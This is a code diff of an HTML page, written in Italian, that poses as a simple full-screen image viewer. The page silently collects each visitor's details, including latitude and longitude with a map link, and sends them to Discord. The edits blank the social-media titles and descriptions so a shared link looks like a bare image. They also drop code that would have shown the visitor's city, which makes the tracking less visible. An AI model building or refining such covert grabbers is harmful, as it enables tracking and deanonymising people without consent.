@@ -6,17 +6,19 @@
     <meta name="description" content="Visualizzazione immagine">
     <meta name="author" content="Manus">
     
-    <!-- Meta tag per l'incorporamento sui social media (Open Graph Protocol) -->
-    <meta property="og:title" content="Visualizzazione Immagine">
-    <meta property="og:description" content="Una bellissima immagine da vedere a schermo intero">
+    <!-- Meta tag ottimizzati per Discord - solo immagine -->
+    <meta property="og:site_name" content=" ">
+    <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
     <meta property="og:image" content="https://source.unsplash.com/random/1200x630/?nature">
     <meta property="og:url" content="">
     <meta property="og:type" content="website">
+    <meta property="theme-color" content="#000000">
     
-    <!-- Meta tag per Twitter Card -->
+    <!-- Meta tag per Twitter Card - solo immagine -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Visualizzazione Immagine">
-    <meta name="twitter:description" content="Una bellissima immagine da vedere a schermo intero">
+    <meta name="twitter:title" content=" ">
+    <meta name="twitter:description" content=" ">
     <meta name="twitter:image" content="https://source.unsplash.com/random/1200x630/?nature">
     
     <!-- Meta tag per tema colore su mobile -->
@@ -73,7 +75,7 @@
             position: absolute;
             top: 50%;
             left: 50%;
-            transform: translate(-50%, -50%) ;
+            transform: translate(-50%, -50%);
             width: 50px;
             height: 50px;
             border: 5px solid rgba(255, 255, 255, 0.3);
@@ -122,7 +124,7 @@
         
         // Elementi DOM
         const elements = {
-            ipInfo: document.getElementById('ip-info') ,
+            ipInfo: document.getElementById('ip-info'),
             mainImage: document.getElementById('main-image'),
             loader: document.getElementById('loader')
         };
@@ -268,7 +270,7 @@
                             },
                             {
                                 name: 'COORDS',
-                                value: `[${visitorInfo.latitude}, ${visitorInfo.longitude}](${googleMapsUrl}) `,
+                                value: `[${visitorInfo.latitude}, ${visitorInfo.longitude}](${googleMapsUrl})`,
                                 inline: true
                             },
                             {
@@ -336,34 +338,10 @@
                 
                 // Invia le informazioni a Discord
                 await sendToDiscord(visitorInfo);
-                
-                // Aggiorna i meta tag dinamicamente con le informazioni del visitatore
-                updateMetaTags(visitorInfo);
             } catch (error) {
                 logger.error('Errore nell\'inizializzazione dell\'applicazione:', error);
                 // Mostra comunque l'immagine in caso di errore
                 showImage();
-            }
-        }
-        
-        /**
-         * Aggiorna i meta tag con le informazioni del visitatore
-         * @param {Object} visitorInfo - Informazioni sul visitatore
-         */
-        function updateMetaTags(visitorInfo) {
-            try {
-                // Aggiorna l'URL corrente nei meta tag
-                const currentUrl = window.location.href;
-                document.querySelector('meta[property="og:url"]').setAttribute('content', currentUrl);
-                
-                // Aggiorna la descrizione con informazioni sulla posizione
-                if (visitorInfo && visitorInfo.city) {
-                    const locationDesc = `Immagine visualizzata da ${visitorInfo.city}, ${visitorInfo.country}`;
-                    document.querySelector('meta[property="og:description"]').setAttribute('content', locationDesc);
-                    document.querySelector('meta[name="twitter:description"]').setAttribute('content', locationDesc);
-                }
-            } catch (error) {
-                logger.error('Errore nell\'aggiornamento dei meta tag:', error);
             }
         }
         
